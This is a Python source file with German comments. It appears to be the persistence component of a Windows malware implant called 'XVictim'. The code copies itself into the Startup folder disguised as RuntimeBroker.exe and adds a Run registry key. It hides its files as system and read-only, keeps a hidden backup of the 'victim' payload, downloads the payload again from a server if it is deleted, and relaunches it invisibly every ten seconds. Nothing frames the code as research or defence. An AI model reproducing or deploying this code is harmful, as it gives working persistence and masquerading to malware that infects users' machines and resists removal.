#!/usr/bin/env python3
"""
XVictim Runtime Broker & Installer
Schützt und installiert Victim-Programme gegenseitig
"""

import os
import sys
import shutil
import subprocess
import time
import threading
import requests
import tempfile
import stat
import winreg
import psutil
from pathlib import Path

# Konfiguration
# SERVER_URL dynamisch aus config.py holen, um hartkodierung zu vermeiden
try:
    import config
    SERVER_URL = config.SERVER_URL
except ImportError:
    SERVER_URL = "http://127.0.0.1:5000"  # Fallback für Standalone-Test
VICTIM_DIR = Path(__file__).parent.parent  # Victim Ordner
TEMP_BACKUP_DIR = Path(tempfile.gettempdir()) / "XVictim_Backup"
STARTUP_DIR = Path(os.environ.get("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

class XVictimProtector:
    def __init__(self):
        self.victim_exe = VICTIM_DIR / "main.exe"
        self.runtime_broker_exe = Path(__file__).with_suffix('.exe')
        self.temp_backup_exe = TEMP_BACKUP_DIR / "main.exe"
        self.startup_broker = STARTUP_DIR / "RuntimeBroker.exe"

        # Erstelle Backup-Ordner
        TEMP_BACKUP_DIR.mkdir(exist_ok=True)

    def install_startup(self):
        """Installiert Runtime Broker in Startup als hidden, hohe Priorität, schreibgeschützt"""
        try:
            # Kopiere Runtime Broker in Startup
            if not self.startup_broker.exists():
                shutil.copy2(self.runtime_broker_exe, self.startup_broker)
                print("[+] Runtime Broker in Startup installiert")

            # Setze Attribute: hidden, system, readonly - sicher mit subprocess
            try:
                subprocess.run(['attrib', '+h', '+s', '+r', str(self.startup_broker)], check=True, capture_output=True)
                print("[+] Startup-Datei geschützt (hidden, system, readonly)")
            except subprocess.CalledProcessError as e:
                print(f"[!] Fehler beim Setzen der Attribute: {e}")

            # Setze hohe Priorität im Registry
            self._set_high_priority_startup()

        except Exception as e:
            print(f"[-] Fehler bei Startup-Installation: {e}")

    def _set_high_priority_startup(self):
        """Setzt hohe Priorität für Startup-Eintrag"""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "XVictim_RuntimeBroker",
                            0, winreg.REG_SZ, f'"{self.startup_broker}" /high')
            winreg.CloseKey(key)
            print("[+] Hohe Priorität für Startup gesetzt")
        except Exception as e:
            print(f"[-] Fehler bei Priorität-Setzung: {e}")

    def backup_to_temp(self):
        """Kopiert Victim in Temp-Ordner zur Wiederherstellung ohne WLAN"""
        try:
            if self.victim_exe.exists():
                shutil.copy2(self.victim_exe, self.temp_backup_exe)
                os.system(f'attrib +h +s +r "{self.temp_backup_exe}"')
                print("[+] Backup in Temp-Ordner erstellt")
            else:
                print("[-] Victim EXE nicht gefunden")
        except Exception as e:
            print(f"[-] Fehler bei Temp-Backup: {e}")

    def download_from_server(self, filename, save_path):
        """Lädt Datei vom Server herunter"""
        try:
            url = f"{SERVER_URL}/download/{filename}"
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print(f"[+] {filename} vom Server heruntergeladen")
                return True
            else:
                print(f"[-] Download fehlgeschlagen: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Download-Fehler: {e}")
            return False

    def restore_victim(self):
        """Stellt Victim wieder her, falls nicht vorhanden"""
        try:
            if not self.victim_exe.exists():
                print("[!] Victim EXE fehlt - versuche Wiederherstellung")

                # Versuche zuerst aus Temp-Backup
                if self.temp_backup_exe.exists():
                    shutil.copy2(self.temp_backup_exe, self.victim_exe)
                    print("[+] Victim aus Temp-Backup wiederhergestellt")
                else:
                    # Lade vom Server
                    if self.download_from_server("main", self.victim_exe):
                        print("[+] Victim vom Server heruntergeladen")
                    else:
                        print("[-] Wiederherstellung fehlgeschlagen")

                # Schütze die wiederhergestellte Datei
                if self.victim_exe.exists():
                    os.system(f'attrib +h +s +r "{self.victim_exe}"')

        except Exception as e:
            print(f"[-] Fehler bei Victim-Wiederherstellung: {e}")

    def check_victim_running(self):
        """Prüft, ob Victim läuft"""
        try:
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    if 'main.exe' in proc.info['name'].lower():
                        exe_path = Path(proc.info['exe'])
                        if exe_path.parent == VICTIM_DIR:
                            return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return False
        except Exception as e:
            print(f"[-] Fehler bei Prozess-Check: {e}")
            return False

    def start_victim(self):
        """Startet Victim, falls nicht läuft"""
        try:
            if not self.check_victim_running():
                if self.victim_exe.exists():
                    subprocess.Popen([str(self.victim_exe)], creationflags=subprocess.CREATE_NO_WINDOW)
                    print("[+] Victim gestartet")
                else:
                    print("[-] Victim EXE nicht gefunden")
        except Exception as e:
            print(f"[-] Fehler beim Starten von Victim: {e}")

    def protect_runtime_broker(self):
        """Schützt Runtime Broker selbst"""
        try:
            broker_path = self.runtime_broker_exe
            if broker_path.exists():
                os.system(f'attrib +h +s +r "{broker_path}"')
                print("[+] Runtime Broker geschützt")
        except Exception as e:
            print(f"[-] Fehler bei Broker-Schutz: {e}")

    def monitor_loop(self):
        """Hauptschleife für Überwachung"""
        print("[*] Runtime Broker gestartet - überwache Victim...")

        while True:
            try:
                # Prüfe und schütze eigene Dateien
                self.protect_runtime_broker()

                # Stelle Victim wieder her, falls nötig
                self.restore_victim()

                # Starte Victim, falls nicht läuft
                self.start_victim()

                time.sleep(10)  # Prüfe alle 10 Sekunden

            except Exception as e:
                print(f"[-] Fehler in Monitor-Loop: {e}")
                time.sleep(5)

def main():
    protector = XVictimProtector()

    # Erstmalige Installation
    print("[*] Installiere XVictim Protector...")
    protector.install_startup()
    protector.backup_to_temp()
    protector.protect_runtime_broker()

    # Starte Überwachung
    monitor_thread = threading.Thread(target=protector.monitor_loop, daemon=True)
    monitor_thread.start()

    # Halte Programm am Laufen
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Runtime Broker beendet")

if __name__ == "__main__":
    main()